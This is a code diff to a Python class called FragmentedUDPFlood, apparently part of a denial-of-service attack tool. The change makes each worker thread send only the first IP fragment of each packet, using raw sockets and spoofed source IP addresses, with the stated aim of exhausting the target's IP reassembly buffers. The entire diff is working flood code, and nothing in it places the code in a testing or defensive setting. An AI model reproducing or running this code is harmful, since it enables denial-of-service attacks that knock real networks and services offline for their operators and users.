@@ -343,35 +343,26 @@ class FragmentedUDPFlood(AttackStrategy):
         )
         return fragments
 
-    def _send_fragments(self, fragments, dest_ip):
-        """Send fragments to the target, potentially out of order."""
+    def _send_incomplete_fragments(self, fragments, dest_ip):
+        """Send only the first fragment to the target, never enough for reassembly."""
         sent_count = 0
-
         try:
             sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_UDP)
             sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
 
-            fragment_order = list(range(len(fragments)))
-            random.shuffle(fragment_order)
-
-            for i in fragment_order:
-                try:
-                    sock.sendto(fragments[i], (dest_ip, 0))
-                    sent_count += 1
-                    time.sleep(0.001)
-
-                except Exception as e:
-                    self.logger.error(f"Error sending fragment {i}: {e}")
-                    continue
-
+            # Only send the first fragment (incomplete set)
+            try:
+                sock.sendto(fragments[0], (dest_ip, 0))
+                sent_count += 1
+                time.sleep(0.001)
+            except Exception as e:
+                self.logger.error(f"Error sending incomplete fragment: {e}")
             sock.close()
-
         except Exception as e:
-            error_msg = f"Error creating socket for fragments: {e}"
+            error_msg = f"Error creating socket for incomplete fragments: {e}"
             self.logger.error(error_msg)
             self._print_error(error_msg)
             return 0
-
         return sent_count
 
     def _check_privileges(self):
@@ -391,7 +382,7 @@ class FragmentedUDPFlood(AttackStrategy):
         return threads
 
     def _udp_fragment_worker(self):
-        """Worker thread for sending fragmented UDP packets with IP spoofing."""
+        """Worker thread for sending incomplete fragmented UDP packets with IP spoofing."""
         thread_id = threading.current_thread().ident
         self.logger.debug(f"UDP Fragment worker thread {thread_id} started")
 
@@ -408,12 +399,13 @@ class FragmentedUDPFlood(AttackStrategy):
                     source_ip, self.target_ip, source_port, self.target_port
                 )
 
-                sent_count = self._send_fragments(fragments, self.target_ip)
+                # Only send the first fragment to stress IP reassembly buffers
+                sent_count = self._send_incomplete_fragments(fragments, self.target_ip)
 
                 if sent_count > 0:
                     self.packets_sent += sent_count
                     self.logger.debug(
-                        f"Sent {sent_count} fragments from spoofed {source_ip}:{source_port}"
+                        f"Sent {sent_count} incomplete fragment from spoofed {source_ip}:{source_port}"
                     )
 
                 time.sleep(0.05)
